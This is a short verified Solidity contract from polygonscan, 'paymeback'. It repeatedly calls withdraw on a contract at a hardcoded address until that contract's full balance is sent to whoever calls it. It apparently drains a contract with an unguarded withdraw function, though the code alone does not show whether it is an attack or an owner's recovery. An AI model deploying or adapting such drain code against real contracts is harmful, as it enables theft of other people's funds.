/**
 *Submitted for verification at polygonscan.com on 2023-07-05
*/

// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

interface CG_Contract {
    function getBalance() external view returns (uint256);
    function withdraw(address where, uint256 amount) external;
}

contract paymeback {
    CG_Contract private cgContract;
    uint256 private constant WITHDRAWAL_AMOUNT = 50 ether;

    constructor() {
        cgContract = CG_Contract(address(0x000D9ACa2eb24f3ff999bFC6800AB27081EA0000));
    }

    function withdrawFunds() external {
        uint256 contractBalance = cgContract.getBalance();
        require(contractBalance >= WITHDRAWAL_AMOUNT, "Insufficient balance to withdraw.");

        uint256 remainingBalance = contractBalance;
        uint256 withdrawalAmount = WITHDRAWAL_AMOUNT;

        while (remainingBalance > 0) {
            if (remainingBalance < withdrawalAmount) {
                withdrawalAmount = remainingBalance;
            }

            cgContract.withdraw(msg.sender, withdrawalAmount);

            remainingBalance -= withdrawalAmount;
        }
    }
}